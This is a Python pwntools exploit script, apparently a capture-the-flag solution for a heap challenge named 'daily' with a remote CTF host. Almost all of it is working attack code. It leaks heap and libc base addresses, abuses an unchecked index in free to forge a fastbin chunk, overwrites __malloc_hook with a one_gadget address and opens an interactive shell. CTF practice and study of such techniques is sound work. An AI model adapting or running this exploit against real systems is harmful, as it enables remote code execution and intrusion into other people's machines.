from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./daily")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./daily")
else:
	p = remote("85c3e0fcae5e972af313488de60e8a5a.kr-lab.com","58512")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./daily")

def menu(choice):
	p.sendafter("Your choice:",str(choice))

def add(size,content):
	menu(2)
	p.sendafter("length of daily:",str(size))
	p.sendafter("write you daily\n",content)

def show():
	menu(1)

def edit(index,content):
	menu(3)
	p.sendafter("index of daily:",str(index))
	p.sendafter("the new daily\n",content)

def free(index):
	menu(4)
	p.sendafter("index of daily:",str(index))

def debugf():
	gdb.attach(p,"b *0x400D02")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(0x20,"junk") #0 junk
add(0x500,"a") #1
add(0x70,"b") #2
free(1)
add(0x400,"a"*0x18) #3
show()
p.recvuntil("a"*0x18)
leak_addr = u64(p.recvuntil("2 : b============================\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x30
log.success("heap_base:" + hex(heap_base))
add(0x100 - 0x10,"c" * 8) #1
show()
p.recvuntil("c"*0x8)
leak_addr = u64(p.recvuntil("============================\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
target = heap_base + 0x5f0
payload = p64(0) + p64(target) + p64(0) + p64(0x71)
#debugf()
add(0x80,payload) #4
base_addr = 0x602068
target = heap_base + 0x5d8 
index = (target - base_addr) / 0x10
free(index)
target = libc.symbols["__malloc_hook"] - 0x23
payload = p64(0) + p64(target) + p64(0) + p64(0x71) + p64(target)
edit(4,payload)
add(0x60,"a")
one_gadget = libc.address + 0xf02a4
payload = "aaa" + p64(0) * 2 + p64(one_gadget)
add(0x60,payload)
target = heap_base + 0x5e8
payload = p64(0) + p64(target) + p64(0) + p64(0x71)
edit(4,payload)
base_addr = 0x602068
target = heap_base + 0x5d8 
index = (target - base_addr) / 0x10
free(index)
#menu(2)
#p.sendafter("length of daily:",str(0x10))
p.interactive()
